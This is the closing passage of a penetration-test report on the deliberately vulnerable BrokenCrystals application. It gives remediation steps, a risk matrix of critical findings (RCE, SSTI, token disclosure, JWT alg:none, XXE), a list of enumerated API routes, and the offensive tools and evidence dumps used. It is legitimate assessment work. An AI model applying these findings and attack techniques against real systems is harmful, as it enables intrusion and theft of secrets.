   - DAST: Bright (formerly NeuraLegion) — they wrote BrokenCrystals; using it against their own deliberately vulnerable image is an ideal regression test.

7. **Secrets hygiene.** All values currently embedded in `/api/secrets` and `/proc/self/environ` must rotate. Move to OCI Vault / External Secrets Operator with short-lived credentials and per-pod IAM.

8. **OIDC hardening.** Promote `brokencrystals-client` to a **public** client with PKCE; rotate the leaked `client_secret`; restrict redirect URIs.

9. **Disable Swagger/OpenAPI and GraphQL introspection in production.**
   ```ts
   if (process.env.NODE_ENV !== 'production') { SwaggerModule.setup('swagger', app, doc); }
   GraphQLModule.forRoot({ introspection: false, playground: false, ... })
   ```

10. **HTTP hygiene.** Add `@fastify/helmet` with a strict CSP, set cookie defaults, enable TLS 1.3 at the nginx ingress, and remove the static-error `nginx (reverse proxy)` server banner.

---

## 6. Risk Matrix

| ID | Title | Severity | CVSS | Likelihood | Impact | Priority |
|----|------|----------|------|------------|--------|----------|
| F-01 | RCE via `/api/spawn` | Critical | 10.0 | High | Catastrophic | **P0** |
| F-02 | K8s ServiceAccount token disclosure | Critical | 9.9 | High | Catastrophic | **P0** |
| F-03 | Path traversal + SSRF via `/api/file` | Critical | 9.6 | High | Catastrophic | **P0** |
| F-04 | SSTI RCE on `/api/render` | Critical | 10.0 | High | Catastrophic | **P0** |
| F-05 | Eval RCE on `/api/process_numbers` | Critical | 10.0 | High | Catastrophic | **P0** |
| F-06 | GraphQL `getCommandResult` RCE | Critical | 10.0 | High | Catastrophic | **P0** |
| F-07 | Default `admin:admin` credentials | Critical | 9.8 | High | Catastrophic | **P0** |
| F-08 | JWT `alg:none` bypass | High | 9.1 | Medium | High | **P1** |
| F-09 | XXE on `/api/metadata` | High | 8.2 | Medium | High | **P1** |
| F-10 | XPath injection — credential dump | High | 8.6 | High | High | **P1** |
| F-11 | Secrets disclosure on `/api/secrets` | High | 8.6 | High | High | **P1** |
| F-14 | `.git/` exposed | High | 7.5 | High | High | **P1** |
| F-15 | `.env` exposed | High | 7.5 | High | Medium | **P1** |
| F-12 | Open Redirect | Medium | 6.1 | High | Medium | **P2** |
| F-13 | Reflected output → XSS surface | Medium | 6.1 | Medium | Medium | **P2** |
| F-16 | Swagger publicly reachable | Medium | 5.3 | High | Medium | **P2** |
| F-17 | Cookie attributes | Medium | 5.4 | Medium | Medium | **P2** |
| F-18 | Missing security headers / weak CSP | Medium | 5.4 | High | Medium | **P2** |
| F-19 | `/api/config` info disclosure | Medium | 5.3 | Medium | Low | **P2** |
| F-20 | OIDC client_secret leak | Medium | 5.9 | Medium | Medium | **P2** |
| F-21 | Verbose error / path disclosure | Low | 3.7 | High | Low | P3 |
| F-22 | TLS 1.3 disabled | Low | 3.7 | Low | Low | P3 |
| F-23 | Auxiliary cookie + DNS TXT leak | Low | 3.1 | Low | Low | P3 |

---

## Appendix A — Enumerated API routes

```
/api
/api/auth/admin/login
/api/auth/dom-csrf-flow
/api/auth/jwt/hmac/{login,validate}
/api/auth/jwt/jku/{login,validate}
/api/auth/jwt/jwk/{login,validate}
/api/auth/jwt/kid-sql/{login,validate}
/api/auth/jwt/rsa/signature/validate
/api/auth/jwt/weak-key/{login,validate}
/api/auth/jwt/x5c/{login,validate}
/api/auth/jwt/x5u/{login,validate}
/api/auth/login
/api/auth/oidc-client
/api/auth/simple-csrf-flow
/api/chat/query
/api/config
/api/email/{deleteEmails,getEmails,sendSupportEmail}
/api/file        /api/file/{aws,azure,digital_ocean,google,raw}
/api/goto
/api/mcp
/api/metadata
/api/nestedJson
/api/partners/{partnerLogin,query,searchPartners}
/api/process_numbers
/api/products    /api/products/{latest,views}
/api/render
/api/secrets
/api/spawn
/api/subscriptions
/api/testimonials  /api/testimonials/count
/api/users  /api/users/basic
/api/users/fullinfo/{email}
/api/users/id/{id}
/api/users/ldap
/api/users/oidc
/api/users/one/{email}/{adminpermission,info,photo}
/api/users/search/{name}
/api/v1/userinfo/{email}   /api/v2/userinfo/{email}
/graphql       (introspection ON, `getCommandResult` query)
```

---

## Appendix B — Tools & Evidence Artifacts

- nmap 7.99 (`-sV -sC -Pn -T4`)
- sslscan 2.1.5 / OpenSSL 3.6.2
- whatweb -a 3, wafw00f 2.4.2, nikto 2.6.0
- Swagger spec dump: `/tmp/swagger.json` (47 113 bytes)
- `/proc/self/environ` dump: `/tmp/poc_environ.txt` (5887 bytes)
- `package.json` dump: `/tmp/poc_package.txt` (3587 bytes)
- React bundle dump: `/tmp/bc_app.js` (708 773 bytes) — used for endpoint discovery
- Git-dumper output: `/tmp/bc_git/.git/`
- sqlmap 1.10.4 (level 3 / risk 2 / postgres) — date_from not exploitable with default payloads
- jwt_tool 2.3.0 — rockyou.txt did not crack the HMAC secret; `alg:none` succeeded.

---

*End of report.*
